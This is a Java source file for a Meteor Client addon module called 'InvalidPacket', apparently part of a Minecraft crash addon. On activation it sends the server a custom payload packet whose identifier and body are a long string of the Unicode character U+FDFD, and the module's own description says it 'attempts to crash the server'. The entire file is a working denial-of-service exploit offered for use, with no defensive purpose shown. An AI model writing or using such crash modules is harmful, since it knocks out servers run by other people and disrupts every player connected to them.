package WideCat.MeteorCrashAddon.modules;

import WideCat.MeteorCrashAddon.MeteorCrashAddon;
import io.netty.buffer.Unpooled;
import minegame159.meteorclient.systems.modules.Module;
import minegame159.meteorclient.utils.Utils;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.play.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;

public class InvalidPacket extends Module {

    public InvalidPacket() {
        super(MeteorCrashAddon.CATEGORY, "invalid-packet", "Attempts to crash the server by sending an invalid packet.");
    }

    private final String message = "\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd\ufdfd";

    @Override
    public void onActivate() {
        if (Utils.canUpdate()) {
            mc.player.networkHandler.sendPacket(new CustomPayloadC2SPacket(new Identifier(message),
                    (new PacketByteBuf(Unpooled.buffer())).writeString(message)));
        }

        toggle();
    }

}
